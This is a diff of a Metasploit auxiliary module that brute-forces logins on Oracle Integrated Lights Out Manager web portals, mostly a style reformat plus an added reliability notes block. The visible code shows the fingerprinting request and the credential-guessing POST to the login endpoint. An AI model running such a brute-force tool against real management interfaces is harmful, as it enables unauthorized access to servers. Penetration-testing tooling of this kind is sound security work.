@@ -9,26 +9,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',
-      'Description'    => %{
-        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
-        performs a login brute force attack to identify valid credentials.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle ILO Manager Login Brute Force Utility',
+        'Description' => %q{
+          This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
+          performs a login brute force attack to identify valid credentials.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE,
+        'License' => MSF_LICENSE,
 
-      'DefaultOptions' => { 'SSL' => true }
-  ))
+        'DefaultOptions' => { 'SSL' => true },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443)
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -49,10 +57,11 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_oilom?
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/iPages/i_login.asp',
-        'method'    => 'GET'
-      })
+        {
+          'uri' => '/iPages/i_login.asp',
+          'method' => 'GET'
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       vprint_error("HTTP Connection Failed...")
       return false
@@ -102,17 +111,18 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/iPages/loginProcessor.asp',
-        'method'    => 'POST',
-        'vars_post' =>
-          {
-            'sclink' => '',
-            'username' => user,
-            'password' => pass,
-            'button' => 'Log+In'
-          }
-      })
+        {
+          'uri' => '/iPages/loginProcessor.asp',
+          'method' => 'POST',
+          'vars_post' =>
+            {
+              'sclink' => '',
+              'username' => user,
+              'password' => pass,
+              'button' => 'Log+In'
+            }
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("HTTP Connection Failed...")
       return :abort
@@ -132,6 +142,5 @@ class MetasploitModule < Msf::Auxiliary
     else
       vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
     end
-
   end
 end
